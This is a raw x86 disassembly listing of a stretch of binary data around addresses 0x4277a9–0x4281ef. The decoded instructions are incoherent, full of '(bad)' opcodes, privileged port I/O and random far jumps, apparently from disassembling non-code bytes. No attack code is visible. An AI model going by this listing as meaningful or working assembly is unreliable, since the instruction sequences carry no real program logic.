  4277a9:	test   BYTE PTR [edx+0x51],dl
  4277ac:	jno    0xcf3a2d30
  4277b2:	fs in  eax,dx
  4277b4:	sub    BYTE PTR [ecx],dl
  4277b6:	leave  
  4277b7:	mov    ecx,0xe66a0a14
  4277bc:	xchg   ebp,eax
  4277bd:	sub    eax,0x4737092b
  4277c2:	int    0xc1
  4277c4:	ins    BYTE PTR es:[edi],dx
  4277c5:	fdivr  QWORD PTR [esi]
  4277c7:	fwait
  4277c8:	sbb    BYTE PTR [ebx],0xe4
  4277cb:	add    DWORD PTR ds:0x5a597320,ecx
  4277d1:	imul   esi,esi,0xffffffa2
  4277d4:	jl     0x42775a
  4277d6:	leave  
  4277d7:	dec    ecx
  4277d8:	jns    0x427771
  4277da:	or     dl,BYTE PTR [edi+0x43b5d6b4]
  4277e0:	sub    al,0x5c
  4277e2:	push   esp
  4277e3:	dec    edx
  4277e4:	das    
  4277e5:	icebp  
  4277e6:	jp     0x42783e
  4277e8:	and    BYTE PTR ds:0xfb8de760,0xa1
  4277ef:	aas    
  4277f0:	xor    BYTE PTR [esi],dh
  4277f2:	adc    BYTE PTR [ebx-0x53588210],ch
  4277f8:	cmp    edx,ebp
  4277fa:	cwde   
  4277fb:	dec    ebx
  4277fc:	mov    esp,0x364a860f
  427801:	inc    esi
  427802:	mov    edx,0x2b375ddc
  427807:	cmp    al,bl
  427809:	(bad)  
  42780a:	xchg   edi,eax
  42780b:	pop    ds
  42780c:	(bad)  
  42780d:	cld    
  42780e:	mov    ecx,0xb802
	...
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	into   
  427881:	xchg   edx,eax
  427882:	jp     0x4278ee
  427884:	icebp  
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    eax,0xcb000001
  42788d:	xor    DWORD PTR [eax-0x6b8e3ab7],0x2c9f5c7f
  427897:	lea    ebx,[ecx]
  427899:	pushf  
  42789a:	jmp    0x4c5c:0xa44508fc
  4278a1:	and    ebp,ebp
  4278a3:	pop    ecx
  4278a4:	cmp    bl,bl
  4278a6:	not    DWORD PTR [ecx+0x122b2bc6]
  4278ac:	cli    
  4278ad:	and    ah,BYTE PTR [edi+0x56]
  4278b0:	jge    0x4278f9
  4278b2:	es clc 
  4278b4:	mov    bh,BYTE PTR [esi+0x26d97823]
  4278ba:	mov    eax,0x9422a20e
  4278bf:	cmp    BYTE PTR [ecx],ch
  4278c1:	xor    DWORD PTR [ebx+eax*4],eax
  4278c4:	sub    edx,DWORD PTR [eax-0xe5b5121]
  4278ca:	cmp    al,0x74
  4278cc:	mov    dl,0x9f
  4278ce:	imul   edx,DWORD PTR [edi],0x1c71b227
  4278d4:	popf   
  4278d5:	mov    ds:0x57939326,eax
  4278da:	and    DWORD PTR [eax-0x7d],eax
  4278dd:	lea    eax,[eax]
  4278df:	adc    eax,0x491f00a3
  4278e4:	nop
  4278e5:	ins    BYTE PTR es:[edi],dx
  4278e6:	fs cmp ecx,DWORD PTR ds:[edx+0x36bd8d66]
  4278ee:	pop    ebx
  4278ef:	push   0x2d
  4278f1:	not    DWORD PTR fs:[ebp-0x75]
  4278f5:	sbb    al,0x3f
  4278f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278f8:	addr16 push ebp
  4278fa:	outs   dx,BYTE PTR ds:[esi]
  4278fb:	sbb    BYTE PTR [eax+0x2],0xe2
  4278ff:	adc    esp,edi
  427901:	mov    edx,0x7d0cd639
  427906:	sub    eax,0xb9d056d9
  42790b:	rcl    DWORD PTR [ebx+0x78db2630],0x9d
  427912:	dec    ebp
  427913:	mov    eax,ds:0x3c3a76d4
  427918:	cli    
  427919:	sti    
  42791a:	fstp   QWORD PTR [ecx+edi*4+0x5fa8eba5]
  427921:	or     al,0x26
  427923:	call   DWORD PTR [ebx-0x7a]
  427926:	(bad)  
  427927:	inc    esp
  427928:	jecxz  0x427936
  42792a:	cmp    BYTE PTR [eax+0x3f6a63fc],cl
  427930:	out    0x4c,al
  427932:	inc    esp
  427933:	int3   
  427934:	adc    DWORD PTR [eax-0xd],edx
  427937:	cdq    
  427938:	pop    edx
  427939:	xchg   ebp,eax
  42793a:	xchg   ebx,eax
  42793b:	push   edi
  42793c:	sti    
  42793d:	test   BYTE PTR [edi+0x339860ce],ch
  427943:	(bad)  
  427944:	cmp    esi,ecx
  427946:	jb     0x4278ff
  427948:	xor    DWORD PTR [bx+di+0x7fde],ebp
  42794d:	out    0x34,al
  42794f:	lds    edi,FWORD PTR ds:0x4b14a351
  427955:	push   0xffffffab
  427957:	jbe    0x42793b
  427959:	fidiv  WORD PTR [esp+edi*1+0x5f288562]
  427960:	(bad)  
  427961:	outs   dx,DWORD PTR ds:[esi]
  427962:	stos   BYTE PTR es:[edi],al
  427963:	dec    esi
  427964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427965:	and    BYTE PTR ds:0xd42609a2,ch
  42796b:	add    al,0x65
  42796d:	imul   ecx,DWORD PTR [eax+0x73533dc2],0xbd1b4209
  427977:	xor    al,0xfe
  427979:	cmp    al,0x40
  42797b:	sbb    edx,DWORD PTR [ebx+0x38679c7]
  427981:	aas    
  427982:	sub    esi,DWORD PTR [ebp+esi*8+0x914ca6e]
  427989:	and    BYTE PTR [edx],dh
  42798b:	sub    bh,BYTE PTR [eax+edi*8+0xe95f16]
	...
  4279f2:	add    BYTE PTR [eax],al
  4279f4:	call   0xdea3:0xffa3ffdd
  4279fb:	std    
  4279fc:	inc    edx
  4279fd:	jne    0x4279d7
  4279ff:	xor    DWORD PTR [ebx-0x9090885],0xffffffa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    eax,0xd8000001
  427a0d:	mov    gs,WORD PTR ss:[ebp+0x75a139]
  427a14:	dec    ecx
  427a15:	pop    ecx
  427a16:	mov    eax,0xd817f718
  427a1b:	push   0x63
  427a1d:	fist   DWORD PTR [ecx]
  427a1f:	and    cl,BYTE PTR [edi-0x4dab922b]
  427a25:	mov    ebx,0x54557e74
  427a2a:	push   es
  427a2b:	push   esi
  427a2c:	inc    ebp
  427a2d:	ret    
  427a2e:	hlt    
  427a2f:	jg     0x4279f3
  427a31:	cld    
  427a32:	inc    esi
  427a33:	mov    edx,0x866438c5
  427a38:	sti    
  427a39:	out    dx,al
  427a3a:	xor    DWORD PTR [esp+edx*2-0x75],ecx
  427a3e:	iret   
  427a3f:	and    BYTE PTR [ecx],0x98
  427a42:	xor    esi,edi
  427a44:	ficomp DWORD PTR [ebp+0x7a8c750e]
  427a4a:	pop    edi
  427a4b:	cmp    ebp,ebp
  427a4d:	nop
  427a4e:	xchg   BYTE PTR [ebp-0x556617ea],ch
  427a54:	lea    edx,[ebp+eax*8-0xb02b8a1]
  427a5b:	jbe    0x427ad9
  427a5d:	call   0xffb48027
  427a62:	icebp  
  427a63:	pop    ecx
  427a64:	jb     0x4279f4
  427a66:	cmp    DWORD PTR [edx],ecx
  427a68:	xchg   ebx,eax
  427a69:	aas    
  427a6a:	inc    edx
  427a6b:	sbb    dh,BYTE PTR [esi-0x45]
  427a6e:	push   edi
  427a6f:	mov    ch,0x54
  427a71:	sub    al,0xae
  427a73:	add    BYTE PTR [eax-0x11],dh
  427a76:	int    0xd4
  427a78:	dec    edi
  427a79:	adc    DWORD PTR [edi],edi
  427a7b:	je     0x427ab3
  427a7d:	push   esp
  427a7e:	add    esi,ebx
  427a80:	jle    0x427a27
  427a82:	dec    edx
  427a83:	push   ds
  427a84:	sub    BYTE PTR [eax+0x381a86ac],cl
  427a8a:	jno    0x427a61
  427a8c:	jmp    0x427a91
  427a8e:	mul    esp
  427a90:	jns    0xa17de94e
  427a96:	mov    ebx,0x11623b19
  427a9b:	into   
  427a9c:	pop    es
  427a9d:	or     al,0xd
  427a9f:	sbb    ebp,DWORD PTR [edi+0x17]
  427aa2:	loop   0x427a4e
  427aa4:	push   cs
  427aa5:	ins    DWORD PTR es:[edi],dx
  427aa6:	pop    ebx
  427aa7:	in     al,dx
  427aa8:	inc    edx
  427aa9:	mov    edx,DWORD PTR [esi+0x22]
  427aac:	mov    cl,0x3b
  427aae:	mov    DWORD PTR [ebx+eiz*4-0x7cd616e0],esi
  427ab5:	cmp    cl,dh
  427ab7:	xlat   BYTE PTR ds:[ebx]
  427ab8:	or     cl,BYTE PTR [ebx]
  427aba:	scas   al,BYTE PTR es:[edi]
  427abb:	xor    BYTE PTR [ebx],dl
  427abd:	repz cmp ch,BYTE PTR [ebx-0x63bebf67]
  427ac4:	lods   eax,DWORD PTR ds:[esi]
  427ac5:	sbb    DWORD PTR [esp+ebx*2-0x25],ecx
  427ac9:	or     ecx,DWORD PTR [edx+0x7f]
  427acc:	stos   BYTE PTR es:[edi],al
  427acd:	pop    ebx
  427ace:	jae    0x427b0a
  427ad0:	and    al,cl
  427ad2:	xchg   edi,eax
  427ad3:	int3   
  427ad4:	pop    edi
  427ad5:	xchg   edx,eax
  427ad6:	jae    0x427ab6
  427ad8:	jne    0x427af7
  427ada:	ds mov al,0x16
  427add:	jmp    0x427b0c
  427adf:	xor    eax,0x94eed50c
  427ae4:	xor    eax,0x7b340e8e
  427ae9:	jmp    0x184c5acf
  427aee:	and    bl,BYTE PTR [edx]
  427af0:	inc    ebx
  427af1:	jp     0x427b69
  427af3:	aad    0x52
  427af5:	or     dl,BYTE PTR [edx]
  427af7:	add    DWORD PTR [esi+eiz*8+0x6b5a184b],eax
  427afe:	lods   eax,DWORD PTR ds:[esi]
  427aff:	cmc    
  427b00:	or     esi,ecx
  427b02:	sbb    ebx,esp
  427b04:	sbb    ah,ch
  427b06:	mov    eax,0x2cad22fa
  427b0b:	and    al,0xdc
  427b0d:	loopne 0x427b6c
  427b0f:	adc    DWORD PTR [edi+0x0],eax
	...
  427b72:	add    BYTE PTR [eax],al
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	div    BYTE PTR [edx+ebp*1-0x5704ebab]
  427b86:	add    DWORD PTR [eax],eax
  427b88:	add    eax,0x83000001
  427b8d:	jmp    0x427b6f
  427b8f:	loop   0x427baf
  427b91:	jb     0x427b26
  427b93:	call   0x510:0x7b341736
  427b9a:	inc    esi
  427b9b:	xchg   ebp,eax
  427b9c:	shl    BYTE PTR [esi],cl
  427b9e:	jns    0x427b43
  427ba0:	outs   dx,BYTE PTR ds:[esi]
  427ba1:	sub    bh,BYTE PTR [edx+esi*8+0x72]
  427ba5:	jns    0x427bef
  427ba7:	icebp  
  427ba8:	fstp   TBYTE PTR [ecx+0x341b0444]
  427bae:	hlt    
  427baf:	xchg   edx,eax
  427bb0:	ret    
  427bb1:	and    cl,BYTE PTR [edi]
  427bb3:	repnz sahf 
  427bb5:	adc    DWORD PTR [edi],ecx
  427bb7:	or     al,0x5a
  427bb9:	pop    ebp
  427bba:	ret    
  427bbb:	js     0x427b5d
  427bbd:	xchg   ebx,eax
  427bbe:	jmp    0x45ba:0xd8bf99e5
  427bc5:	dec    esi
  427bc6:	jbe    0x427c27
  427bc8:	pop    eax
  427bc9:	ror    BYTE PTR [edx+0x22],0x85
  427bcd:	pop    ecx
  427bce:	jmp    0xba11:0x8c6cd755
  427bd5:	add    eax,0x6322629b
  427bda:	scas   eax,DWORD PTR es:[edi]
  427bdb:	dec    edi
  427bdc:	outs   dx,BYTE PTR ds:[esi]
  427bdd:	cmp    al,0x9e
  427bdf:	lea    esi,[edi]
  427be1:	mov    bl,0x3f
  427be3:	in     eax,0x21
  427be5:	pop    ebp
  427be6:	daa    
  427be7:	imul   esi,DWORD PTR [edi-0x5],0xffffffe6
  427beb:	cwde   
  427bec:	shr    DWORD PTR [edi-0x33],cl
  427bef:	out    0xd0,eax
  427bf1:	jmp    0x427c62
  427bf3:	pop    ss
  427bf4:	sub    eax,0x321a55ef
  427bf9:	(bad)  [edi]
  427bfb:	dec    ebp
  427bfc:	cmc    
  427bfd:	mov    ch,0x39
  427bff:	lea    edx,ds:0xa7bd845b
  427c05:	cmp    DWORD PTR [ecx],edi
  427c07:	add    DWORD PTR [ecx-0x78f6faa4],0x50feba9c
  427c11:	pop    eax
  427c12:	dec    ebx
  427c13:	sub    BYTE PTR [ecx],bh
  427c15:	xor    DWORD PTR ss:[eax-0x2592ee8c],esp
  427c1c:	or     al,0xe0
  427c1e:	mov    al,0x8b
  427c20:	cmp    DWORD PTR [ecx+0x6f],ebx
  427c23:	lods   eax,DWORD PTR ds:[esi]
  427c24:	sahf   
  427c25:	jne    0x427bca
  427c27:	out    dx,al
  427c28:	outs   dx,DWORD PTR ds:[esi]
  427c29:	push   ecx
  427c2a:	scas   al,BYTE PTR es:[edi]
  427c2b:	jl     0x427c43
  427c2d:	fist   DWORD PTR [si-0x55]
  427c31:	lods   al,BYTE PTR ds:[esi]
  427c32:	les    edi,FWORD PTR [eax-0x5e1e449b]
  427c38:	mov    bl,0x15
  427c3a:	test   BYTE PTR [ebx],bh
  427c3c:	fwait
  427c3d:	xchg   DWORD PTR [ebp-0x64a49fe6],esp
  427c43:	mov    ecx,0x26d57d20
  427c48:	sbb    BYTE PTR [ebp-0x4568259b],al
  427c4e:	add    DWORD PTR [esi-0x1c],edi
  427c51:	addr16 cli 
  427c53:	fstp   QWORD PTR [edi]
  427c55:	pop    edx
  427c56:	stc    
  427c57:	mov    esp,DWORD PTR [ebx-0x2ba01067]
  427c5d:	retf   
  427c5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c5f:	imul   bp,WORD PTR [edx-0x6e],0x9e0d
  427c65:	xchg   esp,eax
  427c66:	ss div al
  427c69:	xor    DWORD PTR [ebp-0x49],eax
  427c6c:	scas   eax,DWORD PTR es:[edi]
  427c6d:	scas   al,BYTE PTR es:[edi]
  427c6e:	jns    0x427c9a
  427c70:	pop    ebx
  427c71:	scas   eax,DWORD PTR es:[edi]
  427c72:	xor    bl,bh
  427c74:	test   eax,0xf5bf5512
  427c79:	cmp    eax,0xe88b538f
  427c7e:	jo     0x427c56
  427c80:	lock ss mov edx,0x7aff1577
  427c87:	sbb    BYTE PTR [esi-0x73752b5d],al
  427c8d:	into   
  427c8e:	mov    ds:0x732f,eax
	...
  427cf3:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0xb0d75d44,ebx
  427d02:	xchg   ebx,eax
  427d03:	mov    al,BYTE PTR [eax]
  427d05:	stos   BYTE PTR es:[edi],al
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    eax,0x16000001
  427d0d:	xor    bh,bl
  427d0f:	outs   dx,DWORD PTR ds:[esi]
  427d10:	xchg   ebp,eax
  427d11:	dec    ecx
  427d12:	xchg   esi,eax
  427d13:	mov    dl,al
  427d15:	or     eax,0xc44b6b34
  427d1a:	js     0x427d60
  427d1c:	jl     0x427d16
  427d1e:	adc    eax,0xb55b4b9
  427d23:	mov    BYTE PTR [ecx-0x473d6d95],al
  427d29:	in     al,0x3e
  427d2b:	iret   
  427d2c:	aas    
  427d2d:	and    BYTE PTR [edi],bl
  427d2f:	inc    esi
  427d30:	ja     0x427cfd
  427d32:	popf   
  427d33:	repnz xchg ebp,eax
  427d35:	clc    
  427d36:	leave  
  427d37:	cmp    dh,BYTE PTR [ecx-0x66]
  427d3a:	ret    0x69b3
  427d3d:	cld    
  427d3e:	pop    ss
  427d3f:	mov    eax,0x319c9f4f
  427d44:	jb     0x427cf0
  427d46:	hlt    
  427d47:	out    0xa1,al
  427d49:	cdq    
  427d4a:	jecxz  0x427dc4
  427d4c:	cmc    
  427d4d:	imul   eax,ebx,0xfda0cddb
  427d53:	nop
  427d54:	jl     0x427dae
  427d56:	inc    esi
  427d57:	push   edi
  427d58:	aaa    
  427d59:	push   ebx
  427d5a:	ror    DWORD PTR [ecx],0x76
  427d5d:	or     dl,BYTE PTR [ebx-0x1f889ad3]
  427d63:	cmp    al,0x22
  427d65:	xchg   esi,eax
  427d66:	mov    WORD PTR [ebx-0x2d04f0a9],?
  427d6c:	enter  0x825d,0x65
  427d70:	repnz fwait
  427d72:	dec    ecx
  427d73:	jb     0x427d48
  427d75:	add    DWORD PTR [eax-0x71],0xffffffcd
  427d79:	xor    eax,0x5cf31fc1
  427d7e:	inc    ebp
  427d7f:	popa   
  427d80:	mov    al,0x7b
  427d82:	or     BYTE PTR [esi-0x43c724c9],dh
  427d88:	in     eax,0x31
  427d8a:	adc    BYTE PTR [ecx-0x8079d10],dl
  427d90:	add    eax,0xdf8550a9
  427d95:	sar    esi,cl
  427d97:	push   eax
  427d98:	(bad)  
  427d99:	or     edx,DWORD PTR [esi+eiz*4+0x1d]
  427d9d:	xor    BYTE PTR [eax],ch
  427d9f:	lods   eax,DWORD PTR ds:[esi]
  427da0:	adc    al,0x54
  427da2:	or     cl,BYTE PTR [eax]
  427da4:	ror    DWORD PTR [eax-0x28],0x6d
  427da8:	int3   
  427da9:	lods   al,BYTE PTR ds:[esi]
  427daa:	xor    BYTE PTR [eax+0x51a3d575],bh
  427db0:	(bad)  [esi]
  427db2:	cmp    BYTE PTR [ebx-0x1a],bl
  427db5:	push   0xffffff9c
  427db7:	inc    esp
  427db8:	xor    BYTE PTR gs:[edi+esi*8-0x4c],ah
  427dbd:	lds    esp,FWORD PTR [ebx-0x65e77c34]
  427dc3:	lods   al,BYTE PTR ds:[esi]
  427dc4:	mov    ebx,0x4af6ecef
  427dc9:	sbb    bl,BYTE PTR [eax+0x9]
  427dcc:	lds    ecx,FWORD PTR [ecx-0x62bc9ad4]
  427dd2:	push   ss
  427dd3:	xchg   ecx,eax
  427dd4:	cmp    DWORD PTR [esi-0x6a],0x10
  427dd8:	je     0x427e13
  427dda:	aaa    
  427ddb:	stos   DWORD PTR es:[edi],eax
  427ddc:	sahf   
  427ddd:	ja     0x427d91
  427ddf:	jmp    0x511a8ba1
  427de4:	adc    ch,BYTE PTR [esi+ebx*8+0x11]
  427de8:	or     edi,DWORD PTR [eax]
  427dea:	jmp    0x589f:0xc02e944d
  427df1:	pop    ss
  427df2:	stos   BYTE PTR es:[edi],al
  427df3:	jns    0x427e69
  427df5:	xchg   DWORD PTR [edi],esp
  427df7:	pushf  
  427df8:	scas   al,BYTE PTR es:[edi]
  427df9:	idiv   bh
  427dfb:	mov    eax,ds:0x31850b46
  427e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e01:	int3   
  427e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e03:	pop    ecx
  427e04:	in     al,0xed
  427e06:	xchg   ecx,eax
  427e07:	dec    ebx
  427e08:	hlt    
  427e09:	aam    0x2
  427e0b:	(bad)  [ebx+0x4da5255]
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	inc    eax
  427e81:	cmp    DWORD PTR [edi],edi
  427e83:	jno    0x427e8a
  427e85:	stos   DWORD PTR es:[edi],eax
  427e86:	add    DWORD PTR [eax],eax
  427e88:	add    eax,0xa4000001
  427e8d:	xchg   edi,eax
  427e8e:	js     0x427e73
  427e90:	stos   BYTE PTR es:[edi],al
  427e91:	jl     0x427ed0
  427e93:	enter  0xd617,0x6f
  427e97:	ror    DWORD PTR [edx],1
  427e99:	rol    DWORD PTR [eax],cl
  427e9b:	jl     0x427f18
  427e9d:	rol    BYTE PTR [edi-0x78],0x8
  427ea1:	mov    edi,0x17c99c94
  427ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ea7:	(bad)  
  427ea8:	js     0x427ee7
  427eaa:	mov    bl,0x3b
  427eac:	dec    esi
  427ead:	repz je 0x427e95
  427eb0:	sbb    BYTE PTR [ecx],ch
  427eb2:	fdiv   QWORD PTR [ecx+0x7c40ab73]
  427eb8:	ret    0xf698
  427ebb:	aad    0x80
  427ebd:	stos   DWORD PTR es:[edi],eax
  427ebe:	mov    esp,0xd131da32
  427ec3:	pop    esp
  427ec4:	ins    DWORD PTR es:[edi],dx
  427ec5:	dec    eax
  427ec6:	jge    0x427f28
  427ec8:	mov    ds,WORD PTR [eax-0x34]
  427ecb:	adc    ebx,DWORD PTR [ebx+0x1c]
  427ece:	jecxz  0x427ef7
  427ed0:	stos   DWORD PTR es:[edi],eax
  427ed1:	push   ebx
  427ed2:	or     eax,DWORD PTR [ebp-0x46]
  427ed5:	imul   esp,DWORD PTR [eax],0xffffff81
  427ed8:	gs mov ebx,0x8eaa43fd
  427ede:	adc    edi,DWORD PTR [ecx]
  427ee0:	and    bl,bl
  427ee2:	dec    ebx
  427ee3:	call   0x6021ed6d
  427ee8:	mov    ebp,0xe6e7ac48
  427eed:	(bad)  
  427eee:	in     al,0x16
  427ef0:	jb     0x427f6f
  427ef2:	jle    0x427eee
  427ef4:	fcomp  DWORD PTR [eax+edi*2-0x863cb8b]
  427efb:	ds dec ebp
  427efd:	rol    BYTE PTR ds:0x42fcfe26,0x8e
  427f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f05:	sbb    eax,0xa591234e
  427f0a:	in     al,dx
  427f0b:	aad    0x55
  427f0d:	and    edi,esp
  427f0f:	add    al,0x94
  427f11:	pop    es
  427f12:	mov    ebx,0xbd9b7867
  427f17:	mov    WORD PTR [ecx+0x11],es
  427f1a:	adc    eax,0x82cfcb41
  427f1f:	mov    ds,WORD PTR [esi-0xc8dc8ab]
  427f25:	sbb    bh,BYTE PTR [ebx+edi*2]
  427f28:	push   ss
  427f29:	push   edx
  427f2a:	xchg   edi,eax
  427f2b:	sbb    al,0x12
  427f2d:	or     al,0xf4
  427f2f:	cmp    ecx,esp
  427f31:	aam    0xfc
  427f33:	rcl    esi,0x21
  427f36:	push   esi
  427f37:	mov    eax,0x8e62b3f7
  427f3c:	cdq    
  427f3d:	aam    0x3f
  427f3f:	jl     0x427ed2
  427f41:	loope  0x427f07
  427f43:	sub    edi,DWORD PTR [edx+0x35]
  427f46:	push   0xdf8b1e45
  427f4b:	test   DWORD PTR [ebx],eax
  427f4d:	fist   DWORD PTR [edi]
  427f4f:	add    eax,0x39c0ba9
  427f54:	mov    ebx,0xca35641b
  427f59:	cmc    
  427f5a:	push   esp
  427f5b:	and    eax,0x9e7794b4
  427f60:	sub    ecx,esp
  427f62:	test   eax,0xf331a2ae
  427f67:	mov    edx,DWORD PTR [ecx]
  427f69:	iret   
  427f6a:	das    
  427f6b:	push   ebp
  427f6c:	pop    ds
  427f6d:	mov    ebx,0x9c9af3f
  427f72:	xchg   esp,eax
  427f73:	dec    ebp
  427f74:	ja     0x427f37
  427f76:	xor    DWORD PTR [eax+0x44],edi
  427f79:	shr    BYTE PTR [ebx+0x45851330],1
  427f7f:	imul   esi,ecx,0x1877280b
  427f85:	jecxz  0x427ffb
  427f87:	das    
  427f88:	dec    edi
  427f89:	pop    ss
  427f8a:	fcmovnb st,st(2)
  427f8c:	xchg   esi,eax
  427f8d:	jno    0x427f8e
  427f8f:	out    0xf3,eax
	...
  427ff1:	add    BYTE PTR [eax],al
  427ff3:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	add    al,0x64
  428002:	(bad)  
  428003:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428004:	or     ch,BYTE PTR [ecx+eax*1+0x10500]
  42800b:	add    BYTE PTR [eax],bh
  42800d:	lea    ecx,[edi]
  42800f:	retf   
  428010:	mov    esi,0x2b7b500a
  428015:	test   dh,bl
  428017:	xchg   ebp,eax
  428018:	and    dl,BYTE PTR [edi]
  42801a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42801b:	push   0x67548529
  428020:	mov    ah,0x1a
  428022:	fcomip st,st(7)
  428024:	sbb    esi,ebp
  428026:	mov    al,0x89
  428028:	lds    ebp,FWORD PTR [eax]
  42802a:	cmp    ebp,DWORD PTR ss:[edi-0x14b8e1c3]
  428031:	xchg   edi,eax
  428032:	mov    bl,0xba
  428034:	scas   eax,DWORD PTR es:[edi]
  428035:	fs iret 
  428037:	and    eax,DWORD PTR [eax]
  428039:	dec    esp
  42803a:	aad    0xe9
  42803c:	popf   
  42803d:	in     al,0x80
  42803f:	mov    BYTE PTR [eax],bl
  428041:	adc    bl,al
  428043:	out    0x8,al
  428045:	out    dx,al
  428046:	sbb    eax,0x3b9e5106
  42804b:	sub    esp,DWORD PTR [eax]
  42804d:	xchg   DWORD PTR [ebx-0x3f7ad020],esi
  428053:	addr16 popf 
  428055:	lds    esi,FWORD PTR [edx]
  428057:	sbb    dh,cl
  428059:	iret   
  42805a:	push   ecx
  42805b:	jle    0x428076
  42805d:	clc    
  42805e:	xchg   BYTE PTR [ecx+0x39d7739],bh
  428064:	out    0x17,eax
  428066:	mov    al,0xd1
  428068:	mov    dh,0x43
  42806a:	shl    DWORD PTR [eax],cl
  42806c:	add    al,0xcc
  42806e:	mov    dl,BYTE PTR [ebx]
  428070:	loope  0x42809e
  428072:	enter  0xb541,0x11
  428076:	(bad)  
  428077:	pop    ebp
  428078:	cld    
  428079:	dec    esi
  42807a:	mov    esi,0x83db4beb
  42807f:	into   
  428080:	xchg   esp,eax
  428081:	push   es
  428082:	add    BYTE PTR [ebx-0x1d],dl
  428085:	ins    BYTE PTR es:[edi],dx
  428086:	pop    edx
  428087:	adc    eax,0x886de152
  42808c:	adc    eax,0x29b9cbf0
  428091:	test   eax,0x66061879
  428096:	mov    esp,0xb6d70490
  42809b:	pop    ebx
  42809c:	not    DWORD PTR [esi-0x1f2fc4cc]
  4280a2:	test   al,0x75
  4280a4:	(bad)  
  4280a5:	or     DWORD PTR [ebx-0x1218803c],edx
  4280ab:	cmp    eax,ecx
  4280ad:	xor    BYTE PTR [eax+edx*4],dh
  4280b0:	mov    edi,0xbd067d2e
  4280b5:	ja     0x4280af
  4280b7:	xor    DWORD PTR [edx],esi
  4280b9:	cmc    
  4280ba:	imul   ebp,eax,0x1f
  4280bd:	mov    bl,0xb2
  4280bf:	test   ebx,ebp
  4280c1:	dec    ebp
  4280c2:	jmp    0x4280d0
  4280c4:	dec    ebx
  4280c5:	or     al,0x8a
  4280c7:	fmul   QWORD PTR ds:[esi]
  4280ca:	jg     0x42812c
  4280cc:	push   ecx
  4280cd:	adc    edx,DWORD PTR [ebp+0x329ba63a]
  4280d3:	cmp    eax,0xa82a1859
  4280d8:	pop    ebx
  4280d9:	xchg   edx,eax
  4280da:	cs aaa 
  4280dc:	push   0x4f0e74e2
  4280e1:	fidiv  WORD PTR [edi+0x2dffb710]
  4280e7:	mov    ch,0x3
  4280e9:	cli    
  4280ea:	popf   
  4280eb:	ds mov esi,0xbd18f179
  4280f1:	out    dx,al
  4280f2:	nop
  4280f3:	inc    ecx
  4280f4:	in     eax,dx
  4280f5:	pushf  
  4280f6:	mov    edx,0xa650274e
  4280fb:	mov    dl,0x34
  4280fd:	pop    eax
  4280fe:	cmp    BYTE PTR [eax],ch
  428100:	adc    edi,DWORD PTR [edx-0x9]
  428103:	push   ebx
  428104:	and    al,0xe7
  428106:	pushf  
  428107:	inc    edi
  428108:	dec    esp
  428109:	mov    al,0xd
  42810b:	je     0x42811a
  42810d:	in     al,dx
  42810e:	imul   eax,ebx,0x9f
	...
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	std    
  428181:	icebp  
  428182:	push   edi
  428183:	cmp    ecx,DWORD PTR [edi]
  428185:	lods   eax,DWORD PTR ds:[esi]
  428186:	add    DWORD PTR [eax],eax
  428188:	add    eax,0x10000001
  42818d:	rcr    dh,1
  42818f:	mov    bl,BYTE PTR [ebx]
  428191:	dec    ebp
  428192:	ins    DWORD PTR es:[edi],dx
  428193:	test   ebx,0x592578eb
  428199:	push   esp
  42819a:	loopne 0x4281d0
  42819c:	mov    ah,0xbd
  42819e:	xor    al,dh
  4281a0:	dec    edx
  4281a1:	inc    edx
  4281a2:	mov    ecx,0xdee9de2f
  4281a7:	sub    edi,DWORD PTR [ebp+0x57]
  4281aa:	mov    ch,0xd4
  4281ac:	adc    ebp,esp
  4281ae:	cmp    ch,al
  4281b0:	xor    al,0x3f
  4281b2:	les    ebp,FWORD PTR [esi]
  4281b4:	pop    edx
  4281b5:	lods   al,BYTE PTR ds:[esi]
  4281b6:	jbe    0x4281d8
  4281b8:	jg     0x4281af
  4281ba:	mov    edi,DWORD PTR [ebp+0x212c13cb]
  4281c0:	ficomp WORD PTR [eax+0x3ea6437b]
  4281c6:	pushf  
  4281c7:	mov    edi,DWORD PTR [esi+0x1b50cda1]
  4281cd:	or     BYTE PTR ds:0x88f9d7ac,bh
  4281d3:	add    ecx,ebx
  4281d5:	in     al,dx
  4281d6:	xchg   ebx,eax
  4281d7:	inc    esi
  4281d8:	inc    edi
  4281d9:	fistp  WORD PTR [edx-0x50]
  4281dc:	es ret 
  4281de:	out    dx,al
  4281df:	icebp  
  4281e0:	xchg   DWORD PTR [edx],edx
  4281e2:	mov    edx,0x3f23521f
  4281e7:	fdivr  DWORD PTR [eax-0x17]
  4281ea:	add    eax,0xba0903b1
  4281ef:	dec    bx
